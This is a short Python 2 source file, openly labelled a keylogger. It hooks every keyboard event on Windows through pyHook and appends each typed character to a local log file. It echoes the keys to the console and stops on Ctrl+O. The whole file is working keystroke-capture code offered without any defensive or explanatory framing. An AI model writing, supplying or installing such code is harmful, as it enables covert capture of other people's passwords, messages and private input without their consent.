#! python2

# Python keylogger

import pythoncom
import pyHook
import sys
import logging
import time

log = "" 
logdir = "loggedfiles\log.txt"

openfile = open(logdir, "w")
openfile.write("")

def OnKeyboardEvent(event):
	try:
		global log
		if event.Ascii == 27:
			log = "[ESC]"
		elif event.Ascii == 8:
			log = "[Backspace]"
		elif event.Ascii == 15:
			openfile.close()
			sys.exit()
		
			
		
		elif event.Ascii == 13:
			log = "\n"
		elif event.Ascii == 0:
			log = ""
		else:
			log = chr(event.Ascii)
			print(chr(event.Ascii))
		openfile.write(log)
		
	except:
		pass
	
hm = pyHook.HookManager()
hm.KeyDown = OnKeyboardEvent
hm.HookKeyboard()

while True:
	pythoncom.PumpMessages()